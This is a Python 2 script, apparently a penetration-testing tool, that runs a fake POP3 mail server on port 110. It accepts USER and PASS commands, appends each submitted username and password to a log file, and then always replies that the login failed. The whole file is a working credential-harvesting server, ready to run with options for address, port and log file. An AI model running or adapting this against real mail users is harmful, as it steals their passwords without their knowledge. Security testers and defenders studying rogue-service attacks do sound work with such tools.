#!/usr/bin/env python

# Author: Zer1t0

import socket
import threading
import Queue
import optparse

# Reference:
# POP3 RFC: https://www.rfc-editor.org/rfc/rfc1939.txt

LISTENER_PORT = 110
LISTENER_ADDRESS = "0.0.0.0"
LOGGING_FILE = "users.txt"

# POP3 Messages
GREETING_MSG = "+OK POP3\n"
VALID_USER_MSG = "+OK Send your password\n"
UNKNOWN_COMMAND_MSG = "-ERR Unknown command\n"
INVALID_COMMAND_MSG = "-ERR Invalid command\n"
INVALID_USER_PASS_MSG = "-ERR Invalid user name or password\n"
VALID_USER_PASS_MSG = "+OK You shouldn't be seeing this message, goodbye\n"
FAREWELL_MSG = "+OK bye ;)\n"


# POP3 States
USER_STATE = 1
PASSWORD_STATE = 2
QUIT_STATE = 0


def get_command(line):
    return line.split(" ")[0].upper().rstrip()


def get_arg(line):
    try:
        index = line.index(" ")
        return line[(index+1):].rstrip()
    except Exception as ex:
        return False


def is_valid_user_pass(user, password):
    return False


class POP3FakeCommunication(threading.Thread):

    def __init__(self, sc, queue, addr):
        super(POP3FakeCommunication, self).__init__()
        self.state = USER_STATE
        self.socket = sc
        self.addr = addr
        self.username = ""
        self.password = ""
        self.queue = queue

        self.socket.settimeout(600)  # 10 minutes of timeout

    def send(self, message):
        self.socket.send(message)

    def recv(self):
        return self.socket.recv(1024)

    def close_communication(self):
        self.socket.close()

    def receive_username(self):
            line = self.recv()
            command = get_command(line)
            if not command:
                self.send(UNKNOWN_COMMAND_MSG)
            elif command == "USER":
                self.username = get_arg(line)
                self.state = PASSWORD_STATE
                self.send(VALID_USER_MSG)
            elif command == "QUIT":
                self.state = QUIT_STATE
            else:
                self.send(INVALID_COMMAND_MSG)

    def receive_password(self):
        line = self.recv()
        command = get_command(line)
        if not command:
            self.send(UNKNOWN_COMMAND_MSG)
        elif command == "PASS":
            self.password = get_arg(line)
            # We get an username and password so let's log
            self.queue.put("%s : %s\n" % (self.username, self.password))

            if is_valid_user_pass(self.username, self.password):
                print "What's going on? This code shouldn't be reached"
                self.state = QUIT_STATE
                self.send(VALID_USER_PASS_MSG)
            else:
                self.state = USER_STATE
                self.send(INVALID_USER_PASS_MSG)
        elif command == "QUIT":
            self.state = QUIT_STATE
        else:
            self.send(INVALID_COMMAND_MSG)

    def run(self):
        try:
            self.send(GREETING_MSG)

            while self.state != QUIT_STATE:

                while self.state == USER_STATE:
                    self.receive_username()

                while self.state == PASSWORD_STATE:
                    self.receive_password()

            self.send(FAREWELL_MSG)
        except socket.error as ex:
            print "%s" % ex
            pass
        self.close_communication()


class Logger(threading.Thread):

    def __init__(self, queue, filename):
        super(Logger, self).__init__()
        self.queue = queue
        self.filename = filename

    def write_log(self, message):

        with open(self.filename, "a") as logger:
            logger.write(message)

    def run(self):
        while 1:
            message = self.queue.get()
            self.write_log(message)
            self.queue.task_done()


def set_up_listener():

    messages_queue = Queue.Queue()

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind((LISTENER_ADDRESS, LISTENER_PORT))
    listener.listen(10)

    Logger(messages_queue, LOGGING_FILE).start()

    while 1:
        sc, addr = listener.accept()
        com = POP3FakeCommunication(sc, messages_queue, addr)
        com.setDaemon(True)
        com.start()

    listener.close()


def main():
    global LISTENER_ADDRESS
    global LISTENER_PORT
    global LOGGING_FILE

    parser = optparse.OptionParser()
    parser.add_option("-H", "--host", help="Range to listen to", default=LISTENER_ADDRESS)
    parser.add_option("-p", "--port", help="Port to listen to", type="int", default=LISTENER_PORT)
    parser.add_option("-l", "--log", help="Filename to log users", default=LOGGING_FILE)

    (options, args) = parser.parse_args()

    if options.host:
        LISTENER_ADDRESS = options.host

    if options.port:
        LISTENER_PORT = options.port

    if options.log:
        LOGGING_FILE = options.log

    print "Listening in %s:%d\nLogging users in %s\n" % (LISTENER_ADDRESS, LISTENER_PORT, LOGGING_FILE)

    set_up_listener()

if __name__ == '__main__':
    main()
